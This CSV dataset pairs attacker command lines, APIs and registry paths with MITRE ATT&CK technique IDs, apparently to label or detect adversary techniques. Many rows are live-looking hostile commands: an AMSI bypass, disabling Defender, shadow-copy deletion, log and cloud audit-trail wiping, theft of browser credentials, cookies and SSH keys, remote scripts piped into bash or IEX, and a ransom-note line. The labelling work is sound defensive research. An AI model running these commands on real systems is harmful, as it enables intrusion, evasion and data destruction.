command,mitre_id
"(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] OU Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}",T1087
sudo cp $path_malicious_plist ~/Library/LaunchAgents/$plist_filename,T1543
HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated,T1012
WScript.Shell,T1559
"cp ~/Library/""Application Support/Google/Chrome/Default/Login Data For Account"" ""/tmp/T1555.003_Login Data For Account""",T1555
GetTcpTable2,T1049
ExampleFunction,T1218
icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t,T1546
useradd,T1136
GetDC(),T1106
netsh interface show,T1016
com.apple.quarantine,T1553
ld.so,T1574
net user /add,T1136
New-Item $commandpath -Force | Out-Null,T1548
echo '' > /var/log/messages,T1070
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFind /t REG_DWORD /d 1 /f",T1112
QueueName = $queue,T1619
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders,T1060
"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f",T1112
iptables -F,T1562
%AppData%\Microsoft\Windows\Start Menu\Programs\Startup,T1547
taskmgr.exe /7,T1057
"""""%PROGRAMFILES%\dcrypt""\$dcrypt_exe""",T1486
"Add-DnsClientNrptRule -Namespace "".endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""",T1562
EnvironmentVariables,T1547
CreateNoWindow,T1564
find $search_path -name id_rsa 2>/dev/null >> $output_file,T1552
Invoke-Kerberoast | fl,T1558
delete shadows /all /quiet,T1490
"throw @""",T1218
powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\OneDrive.ps1”,T1059
"Update.exe --processStart {PATH:.exe} --process-start-args ""{CMD:args}""",T1218
foreach ($secondarydirectory in $folderarray),T1083
DeployJava.js,T1518
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1012
ls -la ~/.bash_logout,T1562
PSReadLine,T1070
echo $(openssl passwd -1 art) | pw mod user nobody -h 0,T1078
"logger.exe RUN ""{CMD}""",T1202
wiper-action,T1485
"if [ -x ""$(command -v dmidecode)"" ]; then sudo dmidecode | grep -i ""microsoft\|vmware\|virtualbox\|quemu\|domu""; fi",T1082
kubectl,T1136
"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",T1562
AutodiaDLL,T1574
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose,T1069
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareServer /t REG_DWORD /d 0 /f",T1070
sudo $program_path -f -i $ifname -t 3,T1040
C:\Windows\System32\sethc.exe,T1546
fodhelper.exe,T1548
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPer1_0Server"" /t REG_DWORD /d 10 /f",T1112
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"" /v ""ThreadingModel"" /T REG_SZ /d ""Apartment"" /f",T1546
SendMessage,T1055
if ($_ -match 'End of Silver Ticket attack') { break },T1558
C:\User\1\,T1074
file.io,T1567
"$info.GetEnumerator() | ForEach-Object { ""$($_.Name): $($_.Value)"" }",T1614
aws cloudtrail delete-trail --name $cloudtrail_name --region $region,T1562
dist-packages,T1546
$screenshot,T1113
runexehelper.exe {PATH_ABSOLUTE:.exe},T1218
%APPDATA%\Microsoft\UserSetting,T1074
HKCR\CLSID\...\InprocServer32,T1112
com.[random_name].plist,T1543
HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint” /v Driver /d “spool.dll /f,T1547
curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash,T1059
psexec.py '$domain/$username:$password@$remote_host' '$command',T1569
"echo 'echo ""User: $(whoami)""' >> /tmp/art_payload.sh",T1027
HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run\,T1547
NetUserEnum,T1087
netsh.exe add helper {PATH_ABSOLUTE:.dll},T1546
ioreg,T1082
%USERPROFILE%\AppData\Roaming,T1074
net.exe,T1531
Invoke-Expression $streamcommand,T1059
"reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""$malicious_file""",T1547
sudo cat /dev/null > $system_log_path #truncating the file to zero bytes,T1070
"sc.exe create $service_name binPath= ""$executable_command""",T1564
cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password,T1021
__fnDWORD,T1574
ImportKeyPair,T1098
"IF EXIST ""%temp%\Windows_Defender_Verification.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Verification"" /f )",T1562
cd $PathToAtomicsFolder\T1560.001\victim-files,T1560
echo $ENCODED > $encoded_file && base64 -d < $encoded_file,T1140
-s,T1543
"echo ""4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes — generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones."" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
gcloud logging logs delete projects/$project-id/logs/cloudaudit.googleapis.com%2Factivity --quiet,T1562
chmod +x $autosuid,T1059
if($reboot){Restart-Computer},T1546
ipconfig/all,T1016
dotnet.exe msbuild {PATH:.csproj},T1218
sfind,T1083
"Add-Content ""$env:APPDATA\slipDays.bak"" $days_to_modify",T1070
mv $settings_json_def $settings_json_tmp,T1547
sudo visudo -c -f /usr/local/etc/sudoers,T1548
"reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters"" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f",T1112
then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/$syslog_ng_config_file_name,T1562
copy c:\windows\system32\calc.exe 'C:\users\$user\AppData\local\Microsoft\WindowsApps\foxprow.exe',T1021
"sudo find /var/log -name ""$system_log_name2*"" -exec shred -u -z -n 3 {} \; #using ""shred"" execution",T1070
PIS-APP,T1070
EstsoftAutoUpdate,T1547
$output | Out-File -FilePath $outputFilePath -Encoding ascii,T1560
"rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 ""$inf_to_execute""",T1218
"Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Exec""",T1059
/c cd /d c:\windows\temp\ & reg query HKEY_CURRENT_USER\Software\<username>\PuTTY\Sessions\,T1012
IP Helper,T1036
C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe,T1218
schtasks /query /tn win32times,T1036
Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null,T1484
InstallUtil.exe,T1218
"reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application"" /v ""Start"" /t REG_DWORD /d ""0"" /f",T1562
"set-content -path . -stream $ads_filename -value ""test3""",T1564
EnumpropsExW,T1106
pw usermod nobody -s /bin/sh,T1078
unshadow,T1003
"'@ -OutputAssembly ""$executable_filepath""",T1036
"sc.exe \\$remote_host create $service_name binPath= ""$binary_path"" start=$startup_type type=$service_type",T1543
query user >> %file%,T1033
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce,T1012
inkform.exe,T1553
"Write-Host "" [-] ${user}:$password invalid credentials.`r`n""",T1110
cmd.exe /c chcp >&2,T1614
"FOR /F ""tokens=2*"" %a in ('reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe"" /V PATH') do set microsoft_wordpath=%b",T1218
"set DOTNET_STARTUP_HOOKS=""$preloader_dll""",T1574
InfoClass=7,T1622
aws iam create-user --user-name $username,T1136
LaunchDaemons,T1543
dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser,T1078
"Write-Host ""The federation setup failed""",T1484
sudo log erase --ttl #Deletes only time-to-live log content,T1070
ForEach-Object {,T1007
if ($_.PSIsContainer) { New-Item -ItemType Directory -Path $dest -Force | Out-Null },T1560
Set-MpPreference -DisableBehaviorMonitoring 1,T1562
"""select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];"" | cmd /c $sqlite3_path ""$CookieDBLocation"" | out-file -filepath ""$output_file""",T1539
LderGetProcedureAddress(),T1027
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f",T1484
load(),T1129
REGSVR,T1218
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f",T1547
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",T1564
Remove-Item (Get-PSReadlineOption).HistorySavePath,T1070
New-Item -type Directory $ExcelRegPath | Out-Null,T1137
"if (!(Test-Path ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"")) { reg.exe export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"" /y }",T1547
audit.conf,T1562
MicrosoftEdgeCrashRepoeterTaskMachineUA,T1036
"$orgWallpaper | Out-File -FilePath ""$pointer_to_orginal_wallpaper""",T1491
